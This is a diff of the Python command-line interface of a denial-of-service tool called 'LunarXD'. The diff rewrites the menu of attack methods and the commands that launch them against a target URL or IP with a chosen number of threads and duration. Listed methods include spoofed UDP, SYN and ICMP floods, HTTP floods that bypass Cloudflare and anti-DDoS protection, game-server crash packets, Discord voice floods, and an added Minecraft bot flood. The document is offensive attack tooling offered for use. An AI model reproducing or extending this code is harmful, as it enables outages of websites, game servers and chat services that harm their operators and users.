-{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}dns         {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   DNS flood with randomized queries.                                   {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
-{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}udp-kill    {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Extreme UDP flood with large payloads.                              {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
-{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}icmp-blast  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   ICMP flood with spoofed sources.                                    {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
-{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}syn-strike  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   SYN flood with randomized source IPs.                               {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}udpflood    {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   High-intensity UDP flood with variable packet size and spoofed source to saturate bandwidth.                           {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}tcpflood    {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Aggressive TCP flood with SYN and data packets to exhaust connection limits and resources.                             {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}dns         {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Sophisticated DNS flood with randomized queries to overwhelm DNS servers.                                              {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}udp-kill    {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Extreme UDP flood with large payloads to disrupt network stability.                                                    {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}icmp-blast  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   ICMP flood with spoofed sources to overload network interfaces.                                                        {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}syn-strike  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   SYN flood with randomized source IPs to exhaust server connection tables.                                              {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
 
 {Colorate.Horizontal(Colors.cyan_to_blue, "[")} {yellow_to_white("L7 METHODS")} {Colorate.Horizontal(Colors.cyan_to_blue, "]")}
 
-{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}cc          {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   HTTP GET flood with randomized URLs.                                {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
-{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}post        {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   HTTP POST flood with large payloads.                                {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
-{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}head        {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   HTTP HEAD flood to overload servers.                                {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
-{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}uambypass   {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   HTTP flood with randomized user-agents and IPs.                     {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
-{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}browser     {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Browser-like HTTP requests with session persistence.                {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
-{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}home        {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Targets home pages with spoofed IPs.                                {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
-{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}cfbypass    {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Bypasses Cloudflare with dynamic headers and cookies.               {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
-{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}tls         {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   TLS handshake flood with modern ciphers.                            {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
-{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}ovh         {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Targets OVH-hosted servers with customized requests.                {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
-{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}dgb         {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Floods with anti-DDoS bypass headers.                               {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
-{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}http-storm  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Multi-method HTTP flood (GET/HEAD/OPTIONS).                         {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
-{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}api-killer  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Targets API endpoints with JSON payloads.                           {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}cc          {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   HTTP GET flood with randomized URLs to bypass caching mechanisms.                                                      {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}post        {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   HTTP POST flood with large payloads to consume server processing power.                                                {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}head        {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   HTTP HEAD flood to overload server response handling.                                                                  {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}uambypass   {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   HTTP flood with randomized user-agents and IPs to mimic legitimate traffic.                                            {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}browser     {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Simulates browser-like HTTP requests with session persistence to stress application layers.                            {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}home        {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Targets home pages with spoofed IPs to overwhelm front-end servers.                                                    {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}cfbypass    {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Attempts to bypass Cloudflare protections with dynamic headers and cookies.                                            {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}tls         {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   TLS handshake flood with modern ciphers to exhaust SSL/TLS resources.                                                  {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}ovh         {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Targets OVH-hosted servers with customized HTTP requests to bypass protections.                                        {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}dgb         {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Floods with anti-DDoS bypass headers to target specific protections.                                                   {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}http-storm  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Multi-method HTTP flood (GET/HEAD/OPTIONS) to overwhelm web servers.                                                   {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}api-killer  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Targets API endpoints with JSON payloads to overload backend processing.                                               {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
 
 {Colorate.Horizontal(Colors.cyan_to_blue, "[")} {yellow_to_white("GAME METHODS")} {Colorate.Horizontal(Colors.cyan_to_blue, "]")}
 
-{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}game-crash  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Sends malformed packets to crash game servers.                       {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
-{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}lobby-flood {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Floods game server lobbies with connection requests.                {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}game-crash  {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Sends malformed packets to crash game server protocols.                                                                 {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}lobby-flood {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Floods game server lobbies with connection requests to prevent matchmaking.                                            {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
 
 {Colorate.Horizontal(Colors.cyan_to_blue, "[")} {yellow_to_white("SPECIAL METHODS")} {Colorate.Horizontal(Colors.cyan_to_blue, "]")}
 
-{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}discord     {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Floods Discord voice servers with TCP packets.                      {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}discord     {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Floods Discord voice servers with TCP packets to disrupt communication.                                                {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
+{Colorate.Horizontal(Colors.cyan_to_blue, "┃")}  {white}connect     {Colorate.Horizontal(Colors.cyan_to_blue, "➤")}   Minecraft bot flood with GUI interface for server stress testing.                                                      {Colorate.Horizontal(Colors.cyan_to_blue, "PERMISSION:")}  {gray_to_white("[")}{green_to_white("FREE")}{gray_to_white("]")}
 """)
 
         elif command == "menu":
-            clearcs()
             bannerm2()
 
         elif command == "exit":
-            clearcs()
             print(Colorate.Horizontal(Colors.cyan_to_blue, "> Exiting LunarXD."))
             sys.exit()
+
+        elif command == "connect":
+            print(Colorate.Horizontal(Colors.cyan_to_blue, "> Launching Minecraft bot flood GUI..."))
+            subprocess.run(["python", "minecraft_bot.py"])  # Assuming a separate script for Minecraft bot
+            clearcs()
+            bannerm2()
 
         elif command.startswith(".l7"):
             try:
                 args = command.split()
                 if len(args) < 5:
-                    clearcs()
                     print(Colorate.Horizontal(Colors.cyan_to_blue, "> Usage: .l7 <method> <url> <threads> <duration> [port]"))
                     continue
                 method = args[1].lower()
-
-                if method == "http-storm":
-                    method = "http_storm"
                 url = args[2]
                 threads = int(args[3])
                 duration = int(args[4])
                 port = int(args[5]) if len(args) > 5 else None
-                proxy_type = 5
-                if method not in ["cc", "post", "head", "uambypass", "browser", "home", "cfbypass", "tls", "ovh", "dgb", "http_storm", "api_killer"]:
-                    clearcs()
+                proxy_type = 5  # Default to SOCKS5
+                if method not in ["cc", "post", "head", "uambypass", "browser", "home", "cfbypass", "tls", "ovh", "dgb", "http-storm", "api-killer"]:
                     print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid L7 method. Use 'methods' to list available options."))
                     continue
                 if threads < 1 or duration < 1:
-                    clearcs()
                     print(Colorate.Horizontal(Colors.cyan_to_blue, "> Threads and duration must be positive integers."))
                     continue
                 Launch(method, url, threads, duration, proxy_type, port)
             except (ValueError, IndexError):
-                clearcs()
                 print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid input. Usage: .l7 <method> <url> <threads> <duration> [port]"))
 
         elif command.startswith(".l4"):
             try:
                 args = command.split()
                 if len(args) < 5:
-                    clearcs()
                     print(Colorate.Horizontal(Colors.cyan_to_blue, "> Usage: .l4 <method> <ip> <threads> <duration> [port]"))
                     continue
                 method = args[1].lower()
@@ -1095,25 +1379,21 @@ def main():
                 threads = int(args[3])
                 duration = int(args[4])
                 port = int(args[5]) if len(args) > 5 else None
-                proxy_type = 5
+                proxy_type = 5  # Default to SOCKS5
                 if method not in ["udpflood", "tcpflood", "dns", "udp-kill", "icmp-blast", "syn-strike"]:
-                    clearcs()
                     print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid L4 method. Use 'methods' to list available options."))
                     continue
                 if threads < 1 or duration < 1:
-                    clearcs()
                     print(Colorate.Horizontal(Colors.cyan_to_blue, "> Threads and duration must be positive integers."))
                     continue
                 Launch(method, ip, threads, duration, proxy_type, port)
             except (ValueError, IndexError):
-                clearcs()
                 print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid input. Usage: .l4 <method> <ip> <threads> <duration> [port]"))
 
         elif command.startswith(".game"):
             try:
                 args = command.split()
                 if len(args) < 5:
-                    clearcs()
                     print(Colorate.Horizontal(Colors.cyan_to_blue, "> Usage: .game <method> <ip> <threads> <duration> [port]"))
                     continue
                 method = args[1].lower()
@@ -1121,25 +1401,21 @@ def main():
                 threads = int(args[3])
                 duration = int(args[4])
                 port = int(args[5]) if len(args) > 5 else None
-                proxy_type = 5
+                proxy_type = 5  # Default to SOCKS5
                 if method not in ["game-crash", "lobby-flood"]:
-                    clearcs()
                     print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid game method. Use 'methods' to list available options."))
                     continue
                 if threads < 1 or duration < 1:
-                    clearcs()
                     print(Colorate.Horizontal(Colors.cyan_to_blue, "> Threads and duration must be positive integers."))
                     continue
                 Launch(method, ip, threads, duration, proxy_type, port)
             except (ValueError, IndexError):
-                clearcs()
                 print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid input. Usage: .game <method> <ip> <threads> <duration> [port]"))
 
         elif command.startswith(".discord"):
             try:
                 args = command.split()
                 if len(args) < 4:
-                    clearcs()
                     print(Colorate.Horizontal(Colors.cyan_to_blue, "> Usage: .discord <link> <threads> <duration> [port]"))
                     continue
                 method = "discord"
@@ -1147,18 +1423,15 @@ def main():
                 threads = int(args[2])
                 duration = int(args[3])
                 port = int(args[4]) if len(args) > 4 else None
-                proxy_type = 5
+                proxy_type = 5  # Default to SOCKS5
                 if threads < 1 or duration < 1:
-                    clearcs()
                     print(Colorate.Horizontal(Colors.cyan_to_blue, "> Threads and duration must be positive integers."))
                     continue
                 Launch(method, link, threads, duration, proxy_type, port)
             except (ValueError, IndexError):
-                clearcs()
                 print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid input. Usage: .discord <link> <threads> <duration> [port]"))
 
         else:
-            clearcs()
             print(Colorate.Horizontal(Colors.cyan_to_blue, "> Unknown command. Type 'help' for a list of commands."))
 
 if __name__ == "__main__":
